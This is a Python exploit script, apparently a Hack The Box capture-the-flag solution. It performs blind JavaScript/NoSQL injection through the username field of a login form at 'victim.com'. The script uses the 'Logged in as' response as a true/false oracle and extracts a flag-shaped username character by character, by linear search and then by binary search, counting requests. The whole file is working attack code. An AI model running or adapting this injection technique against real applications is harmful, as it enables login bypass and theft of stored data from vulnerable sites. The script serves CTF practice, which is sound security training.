import requests
from urllib.parse import quote_plus

num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    r = requests.post(
        "http://victim.com/index.php",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="'))
    )
    return "Logged in as" in r.text

assert (oracle('false') == False)
assert (oracle('true') == True)

num_req = 0
username = "HTB{"
i = 4
while username[-1] != "}":
    for c in range(32, 128):
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) == %d' % (i, c)):
            username += chr(c)
            break
    i += 1
assert (oracle('this.username == `%s`' % username) == True)
print("---- Regular search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
print()

num_req = 0
username = "HTB{"
i = 4
while username[-1] != "}":
    low = 32
    high = 127
    mid = 0
    while low <= high:
        mid = (high + low) // 2
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1
        elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1
        else:
            username += chr(mid)
            break
    i += 1
assert (oracle('this.username == `%s`' % username) == True)
print("---- Binary search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
